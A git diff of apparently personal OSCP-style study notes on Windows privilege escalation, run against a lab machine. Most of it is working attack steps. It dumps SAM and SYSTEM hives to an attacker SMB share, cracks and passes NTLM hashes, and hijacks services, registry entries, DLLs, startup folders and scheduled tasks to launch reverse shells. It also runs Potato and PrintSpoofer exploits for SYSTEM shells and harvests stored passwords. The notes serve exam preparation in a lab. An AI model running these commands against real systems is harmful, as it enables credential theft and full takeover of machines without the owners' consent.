@@ -1,13 +1,15 @@
-File Transfer from Remote Machine to Attacker Machine via SMB:
-On Attacker Machine run:
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py DIRECTORYTOMOUNT .
-On Remote Machine run: 
-fileonremotemachine.txt > \\ATTACKERIP\DIRECTORYMOUNTED\fileonremotemachine.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+File Transfer from Remote Machine to Attacker Machine via SMB
 
-File Transfer from Attacker Machine to Remote Machine via SMB:
-On Remote Machine run:
-copy \\ATTACKERIP\DIRECTORYMOUNTED\fileonattackermachine.txt . 
+    On Attacker Machine run:
+    python3 /usr/share/doc/python3-impacket/examples/smbserver.py DIRECTORYTOMOUNT .
+    On Remote Machine run: 
+    copy fileonremotemachine.txt \\ATTACKERIP\DIRECTORYMOUNTED\
 
+    File Transfer from Attacker Machine to Remote Machine via SMB:
+    On Remote Machine run:
+    copy \\ATTACKERIP\DIRECTORYMOUNTED\fileonattackermachine.txt . 
+------------------------------------------------------------------------------------------------------------------------------------------------------
 Kernal Exploits
 
     1. Enumerate Windows versions / patch level (systeminfo)
@@ -19,9 +21,11 @@ Kernal Exploits
       1. Run the systeminfo command and send the info to your attacker machine, then run wesng on that textfile
       2. Precompiled Kernel Exploits can be found https://github.com/SecWiki/windows-kernel-exploits
         a. It's easier to match with this than to compile your own.
+        
     EXAMPLE!!!
+    
       CVE-2018-8120 kernel exploit can run any program. You can run reverse.exe created by msfvenom for a reverse shell
- 
+------------------------------------------------------------------------------------------------------------------------------------------------------
 Service Exploits
 
     Query the config of a service
@@ -42,7 +46,9 @@ Service Exploits
         d. Some are dangerous (ex. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS)
         If our user has permission to change the config of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.
         accesschk.exe can check if a user can start and stop a service 
+        
         EXAMPLE!!! ("user" checking the "daclsvc" service)
+        
         1. Run winPEASany.exe on the system and found daclsvc was writable
         2. .\accesschk.exe /accepteula -uwcqv user daclsvc (this will help check permissions on the file)
         SERVICE_START
@@ -56,9 +62,12 @@ Service Exploits
         sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
         TIP!!!
         If you can change a service config, but cannot stop/start it, you may not be able to escalate privileges
+        
      2. Unquoted Service Path
         a. Windows will check if there are quotes on the service and run the filepath as arguments. We can take advantage of this.
+        
         EXAMPLE!!!
+        
         1. run winPEASany.exe on the system and found C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
         2. run .\accesschk.exe /accepteula -ucqv unquotedsvc (this will help check permissions on the file)
         SERVICE_START
@@ -78,9 +87,12 @@ Service Exploits
          copy reverse.exe "C:\PRogram Files\Unoquoted Path Service\Common.exe"
          5. Start the service
          net start unquotedsvc
+         
      3. Weak Registry Permissions
         Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, we can possibly modify a service's config.
+        
         EXAMPLE!!!
+        
         1. winPEASany.exe found we can modify a service registry
         HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
         2.verify permissions via powershell or acchesschk (we are part of the Interactive group)
@@ -100,10 +112,13 @@ Service Exploits
         reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
         6. Start the service
         net start regsvc
+        
      4. Insecure Service Executables
         If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable
         Always create a backup of the original executable in a real system
+        
         EXAMPLE!!!
+        
         1. Winpeas found  filepermsvc is writeable by everyone "C:\Program Files\File Permissions Service\filepermservice.exe"
         2. Check with accesschk to verify we can write over it
         .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
@@ -119,12 +134,15 @@ Service Exploits
         copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
         6. Start the service
         net start filepermsvc
+        
      5. DLL Hijacking
         Services will try to load funtionality from a library called a DLL. Whatever the funtionality the DLL provides will be executed with the same privileges as the service that loaded it.
         If a DLL is loaded with an absolute path, we may be able to escalate privileges if the DLL is writable
         If a DLL is missing from the system and we have write privileges to the directory within the PATH, we may be able to escalate privileges
         Usually a very manual process
+        
         EXAMPLE!!!
+        
         1. winpeas detected (DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles] and non-Microsoft service dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"]
         (to save time, we are only checking the dllsvc)
         2. check both for start/stop access
@@ -147,13 +165,14 @@ Service Exploits
         net stop dllsvc
         7. Start the service
         net start dllsvc
-      
- Registry Exploits
+-------------------------------------------------------------------------------------------------------------------------------------------------------     
+Registry Exploits
  
      AutoRuns
      Windows can be configured to run commands at startup. AutoRuns are configured in the Registry. If we can write to an AutoRun executable and have privileges to restart the machine, we may be able to escalate privileges
      
      EXAMPLE!!!
+    
      1. Winpeas found "C:\Program Files\Autorun Program\program.exe", FilePerms: Everyone [AllAccess]
      2. use accesschk to verify permissions on the .exe
      .\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
@@ -170,7 +189,9 @@ Service Exploits
      AlwaysInstallElevated 
      MSI files are package files used to install apps. These files run with permission of user trying to install them. These can be run with elevated privileges like admin. We can possibly generate malicious MSI files that have a reverse shell.
       The catch is that two Registry settings must be enabled for this to work. "AlwaysInstallElevated" value must be set to 1 for both local machine and the current user. HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer. If either are missing/disabled the exploit won't work.
+      
       EXAMPLE!!!
+      
       1. winpeas found Checking AlwaysInstallElevated(T1012), AlwaysInstallElevated set to 1 in HKLM!, AlwaysInstallElevated set to 1 in HKCU!
       2. verify by querying the keys
       reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -180,5 +201,380 @@ Service Exploits
       4. startup listener
       5. copy file to machine and run it
       msiexec /quiet /qn /i reverse.msi
-
       
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Passwords
+
+    Admins leave their passwords in readable locations. Windows and several features store passwords insecurely.
+    Some are in the Registry in plaintext/configurations.
+    The following commands will search the registry for keys and values that contain "password".
+    
+    reg query HKLM /f password /t REG_SZ /s
+    reg query HKCU /f password /t REG_SZ /s
+
+    There is usually a lot of generated results, so it is better to look in known locations.
+    
+    EXAMPLE!!!
+    
+    1. winpeas found Looking for AutoLogon credenials and Putty Sessions
+    2. verify by querying registry
+    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
+    reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+    3. login with winexe on Kali to spawn a shell
+    winexe -U 'admin%password123' //192.168.201.130 cmd.exe
+    4. Since the user is an admin, we can modify the command to add --system to become nt authority\system
+    winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe
+
+    Winpeas will help search popular locations, but still need to search manually.
+    
+Saved Creds
+
+    Windows has runas command which allow user to run commands with privileges of other users.
+    Usually requires knowledge of other user's password.
+    However, Windows allows users to save their creds to to the system, and the saved credentials can bypass the requirement.
+    
+    EXAMPLE!!!
+    
+    1. Winpeas found an admin in the credential manager
+    User: MSEDGEWIN10\admin
+    2. verify with cmd
+    cmdkey /list
+    3. use runas command with /savecred flag to run anything we want as the admin user
+    runas /savecred /user:admin C:\PrivEsc\reverse4444.exe
+
+Configuration Files
+
+    Some admins leave config files on the system with passwords in them.
+    Unattend.xml file is one example.
+    It allows for the automated setup of Windows systems.
+    
+    Recursively search for files in the current directory with "pass" in the name, or ending in ".config":4
+    dir /s *pass* == *.config
+    Recursively search for files in the current directory that contain the word "password" and also end in either .xml .ini or .txt
+    findstr /si password *.xml *.ini *.txt
+
+    EXAMPLE!!!
+    
+    1. Winpeas found looking for possible known files that can contain creds, C:\Windows\Panther\Unattend.xml
+    2. check the file
+    type C:\Windows\Panther\Unattend.xml
+    3. Password was found in base64
+    <Password>
+        <Value>cGFzc3dvcmQxMjM=</Value>
+        <Username>Admin</Username>
+    4. Decode it
+    echo "cGFzc3dvcmQxMjM=" | base64 -d
+    password123
+    5. on Kali login with winexe
+    winexe -U 'admin%password123' //192.168.201.130 cmd.exe
+    6. Since the user is an admin, we can modify the command to add --system to become nt authority\system
+    winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe
+
+SAM
+
+    Windows store password hashes in the SAM (Security Account Manager).
+    Hashes are encrypted with a key which can be found in a file named SYSTEM.
+    If you can read the SAM and SYSTEM files, you can extract the hashes.
+    
+    SAM and SYSTEM files are usually located in the C:\Windows\System32\config directory
+    The files are locked while Windows is running
+    Backups may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories
+    
+    EXAMPLE!!!
+    
+    1. Winpeas found Looking for possible known files that can contain creds, C:\Windows\Repair\SAM and C:\Windows\Repair\SYSTEM
+    2. copy files back to kali
+    copy C:\Windows\Repair\SAM \\192.168.201.129\tools\
+    copy C:\Windows\Repair\SYSTEM \\192.168.201.129\tools\
+    3. Use PWDump tool part of Creddump7
+    cd /usr/share/creddump7
+    python3 pwdump.py /home/kali/Downloads/tools/SYSTEM /home/kali/Downloads/tools/SAM
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:20ff0389f84bdbf9ce6fc36af6993b63:::
+    IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+    sshd:1002:aad3b435b51404eeaad3b435b51404ee:42760776cade85fd98103a0f44437800:::
+    user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+    admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+    TIP!!!
+    If the account has "31d" in the beginning, it is possibly there is no password, or the password is disabled
+    4. Use hashcat to crack the admin pass
+    hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlists/rockyou.txt
+    a9fdfa038c4b75ebc76dc855dd74f0da:password123
+    5. on Kali login with winexe
+    winexe -U 'admin%password123' //192.168.201.130 cmd.exe
+    6. Since the user is an admin, we can modify the command to add --system to become nt authority\system
+    winexe -U 'admin%password123' --system //192.168.201.130 cmd.exe
+    
+Passing the Hash
+    
+    Windows will accept hashes instead of passwords to authenticate with a number of services.
+    We can use a modified version of winexe, pth-winexe to spawn a command prompt using the admin user's hash
+    
+    EXAMPLE!!!
+     1. Winpeas found Looking for possible known files that can contain creds, C:\Windows\Repair\SAM and C:\Windows\Repair\SYSTEM
+    2. copy files back to kali
+    copy C:\Windows\Repair\SAM \\192.168.201.129\tools\
+    copy C:\Windows\Repair\SYSTEM \\192.168.201.129\tools\
+    3. Use PWDump tool part of Creddump7
+    cd /usr/share/creddump7
+    python3 pwdump.py /home/kali/Downloads/tools/SYSTEM /home/kali/Downloads/tools/SAM
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:20ff0389f84bdbf9ce6fc36af6993b63:::
+    IEUser:1000:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
+    sshd:1002:aad3b435b51404eeaad3b435b51404ee:42760776cade85fd98103a0f44437800:::
+    user:1003:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+    admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
+    TIP!!!
+    If the account has "31d" in the beginning, it is possibly there is no password, or the password is disabled
+    4. login with the full hash using a modified version of winexe, pth-winexe
+    pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.201.130 cmd.exe
+    5. for a system shell, add the --system flag
+    pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //192.168.201.130 cmd.exe
+    
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Scheduled Tasks
+
+    
+    Windows can be configured to run tasks at a specific times (ex. every 5 mins or when an event is triggered (user logon))
+    tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM
+    No easy method for enumerating custom tasks that belong to other users as a low privileged user account.
+    Often we need to rely on other clues such as finding a script or log file that indicates a scheduled task is being run.
+    
+    List all scheduled tasks your user can see in CMD:
+    schtasks /query /fo LIST /v
+    List all scheduled tasks your user can see in PowerShell:
+    Get-ScheduledTask | where {$_.TaskPath -notlike "/Microsoft*"} | ft TaskName,TaskPath,State
+    
+    EXAMPLE!!!
+    
+    1. found a random script in C:\DevTools called CleanUp.ps1
+    Contents said it will run as SYSTEM
+    2. verify if we can write to the file
+    accesschk.exe /accepteula -quv user C:\DevTools\CleanUp.ps1
+    	FILE_WRITE_DATA
+    3. Can insert our own commands inside the script to execute. Make sure to include the full path to the reverse shell file.
+    echo C:\PrivEsc\reverse4444.exe >> C:\DevTools\CleanUp.ps1 
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Insecure GUI Apps (Citrix Method)
+    On some older versions of Windows, users could be granted permission to run certain GUI apps with admin privileges.
+    There are numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality.
+    Since the parent process is running with admin privileges, so will the spawned shell.
+    Uses many of the same techniques to break out of Citrix environments
+    
+    EXAMPLE!!!
+    1. Open MSPaint on user account on RDP Desktop.
+    2. Check what privilege the app is running as.
+    tasklist /V | findstr mspaint.exe
+    It is running as MSEDGEWIN10\admin 
+    3. In the MSPaint app, go to open > file
+    type in file://c:/windows/system32/cmd.exe
+    4. Command prompt will spawn 
+    
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Startup Apps
+    
+    Each user can define apps that start when they login.
+    Windows has a startup directory for apps that should start for all users:
+     C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+    If we can create files in this directory, we can use our own reverse shell executable and escalate privileges when an admin logs in.
+    
+    EXAMPLE!!!
+    
+    1. Check permissions on the global startup directory
+    .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+      RW BUILTIN\Users (this is the group of our user)
+    2. Add a startup app when a user logins. They must be shortcuts/link files. Can create a vb script to do this.
+    3. VB Script:
+        Set oWS = WScript.CreateObject("WScript.Shell")
+        sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+        Set oLink = oWS.CreateShortcut(sLinkFile)
+        oLink.TargetPath = "C:\PrivEsc\reverse4444.exe"
+        oLink.Save
+    4. Run the script using cscript
+    cscript CreateShortcut.vbs
+    5. Login as admin for simulation
+    
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Installed Apps
+
+    A lot of the exploits for installed apps rely on all the methods previously learned.
+    Go to https://www.exploit-db.com/?type=local&platform=windows and filter for priv esc.
+    
+    EXAMPLE!!!
+    
+    1. Enumerate all running programs
+    tasklist /V
+    2. Can use seatbelt.exe to enumerate for non standard processes, can show the full path of the executable to help determine version number
+    .\seatbelt.exe NonstandardProcesses
+    3. winPEASany.exe can do it too useing the processinfo flag (sometimes mispelled as procesinfo)
+    4. Follow exploitdb instructions
+    
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Hot Potato (CANNOT BE USED ON OSCP)
+
+    It is a spoofing attack and an NTLM relay attack to gain SYSTEM privileges.
+    The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM.
+    The NTLM credentials then get relayed to SMB to gain command execution.
+    Works on Windows 7, 8, and early versions of Windows 10.
+    
+    EXAMPLE!!!
+    
+    1. have a reverseshell as user already
+    2. copy the potato.exe to the machine
+    3. run the potato.exe
+    .\potato.exe -ip 192.168.201.129 -cmd "C:\PrivEsc\reverse4444.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Token Impersonation with Rotten/Juicy Potato/Rogue Potato
+Going from admin to nt authority\local service > nt authority\system
+    
+    --This has been patched in Windows 10--
+    
+    Service accounts can be given special privileges in order for them to run their services and cannot be logged into directly.
+    Multiple problems have been found with service accounts making them easier to escalate privileges with.
+    
+    Original Rotten Potato exploit was identified in 2016.
+    Service accounts could intercept a SYSTEM ticket and use it to impersonate the SYSTEM user.
+    This was possible because the service accounts usually have the "SeImpersonatePrivilege" privilege enabled.
+    
+    Service accounts are generally configured with these two privileges:
+    SeImpersonate and SeAssignPrimaryToken
+    They allow the account to impersonate the access tokens of other users, including the SYSTEM user.
+    
+Juicy Potato    
+    
+    Rotten Potato was a limited exploit. 
+    Juicy Potato works in the same was as Rotten Potato, but the authors did research and found more ways to exploit.
+    https://github.com/ohpe/juicy-potato
+    
+    EXAMPLE!!!
+    1. logged in as admin user and have admin privileges
+    2. run PSexec64.exe to start a reverse shell with the privileges of the local service user attack
+    .\PSExec64.exe -accepteula -i -u "nt authority\local service" reverse.exe
+    3. listener should have got the shell with SeImpersonatePrivilege Enabled
+    whoami /priv
+    4. open another listener
+    5. Run JuicyPotato on the previous reverse shell, 
+       The -c flag must have a valid CLSID for the version of windows 
+       CLSIDs can be found here https://github.com/ohpe/juicy-potato/tree/master/CLSID
+    C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+    6. Another reverse shell should be caught with system privileges
+    
+Rogue Potato
+
+    Works on Win 10
+    https://github.com/antonioCoco/RoguePotato
+    Requires logging in as admin user for initial setup and Copy of PSExec64.exe and RoguePotato.exe exploit binary
+        
+    EXAMPLE!!!
+    
+    3 Terminals open in Kali
+       1. Terminal 1 will have a socat redirector which redirects traffic to port 135 over to port 9999 on the victim machine
+            sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.201.130:9999 
+       2. Terminal 2 will have a reverse shell caught by netcat listener that should have the 2 privileges SeImpersonate and SeAssignPrimaryToken.     
+          We will simulate this via command below on the Windows VM as admin.
+            PsExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse4444.exe
+            On Terminal 2 check priv with whoami and whoami /priv
+            nt authority\local service
+            SeImpersonate
+            SeAssignPrimaryToken
+       3. Terminal 3 will have a netcat listener to catch the system reverse shell ran by the caught reverse shell in terminal 2
+            In terminal 2 run:
+                RoguePotato.exe -r 192.168.201.129 -l 9999 -e "C:\PrivEsc\reverse4444.exe"
+            On terminal 3, check priv with whoami
+            nt authority\system
+
+PrintSpoofer (this exploit won't work without C++ vc_redist.x64.exe already installed on the victim machine"
+    
+    PrintSpoofer is an exploit that targets the Print Spooler service.
+    https://github.com/itm4n/PrintSpoofer
+    Happens entirely on the machine itself.
+    
+    EXAMPLE!!!
+    
+    2 Terminals open in Kali
+        1. Terminal 1 will have a netcat listener to catch a reverse shell with service account privileges. 
+           To simulate this we will use an admin account with PSexec64 and run the following command:
+           PsExec64.exe /accepteula -i -u "nt authority\local service" C:\PrivEsc\reverse4444.exe
+        2. check priv with whoami and whoami /priv
+        nt authority\local service
+        SeImpersonate
+        SeAssignPrimaryToken
+        3. On terminal 2, open another netcat listener
+        4. On terminal 1s reverse shell, run the PrintSpoofer by the following command:
+        PrintSpoofer.exe -i -c "C:\PrivEsc\reverse4444.exe"
+        5. On terminal 2, check priv with whoami
+        nt authority\system
+        
+------------------------------------------------------------------------------------------------------------------------------------------------------    
+Port Forwarding
+    
+    Sometimes it is easier to run exploit code on Kali, but the vulnerable program is listening on an internal port.
+    In this case, we need to forward a port on Kali to the internal port on Windows.
+    We can do this using a program called plink.exe (Makers of PuTTY)
+    Winexe uses port 445
+    
+    EXAMPLE!!!
+    1. With a previous reverse shell, as the user on the victim machine, run plink.exe to redirect port 445
+    plink.exe kali@192.168.201.129 -R 445:127.0.0.1:445
+    2. On attacker machine, run winexe to 127.0.0.1
+    winexe -U 'admin%password123' //127.0.0.1 cmd.exe
+    3. Can add --system flag to become nt authority\system
+    winexe -U 'admin%password123' --system //127.0.0.1 cmd.exe
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Privilege Escalation Strategy
+
+    Enumeration
+    1. Check your user (whoami) and gropus (net user <username>)
+    2. If a low priv user, run winPEAS with fast, searchfast, and cmd options
+    3. Run Seatbelt
+    4. If scripts don't work, must manually run commands
+    
+    Strategy
+    1. Avoid rabbit holes by creating a checklist of things you need for the priv escalation method to work
+    2. Look around for files in user's desktop, C:\ and C:\Program Files
+    3. Read through interesting files
+    4. Try things that don't have many steps first, like registry exploits, services,
+    5. Look at admin processes, enumerate their versions and search for exploits
+    6. Check for internal ports that you might be able to forward to your attacking machine
+    7. If still no admin shell, re-read enumeration dumps and think of kernel exploits
+
+------------------------------------------------------------------------------------------------------------------------------------------------------
+getsystem (Named Pipes and Token Duplication)
+
+    Access Tokens are special objects in Windows which stores a user's identity and privileges.
+    Primary Access Token - Created when the user logs in, bound to the current user session. 
+    When a user starts a new process, their primary access token is copied and attached to the new process.
+    Imporsonation Access Token - Created when a process or thread needs to temporarily run with the security context of another user.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
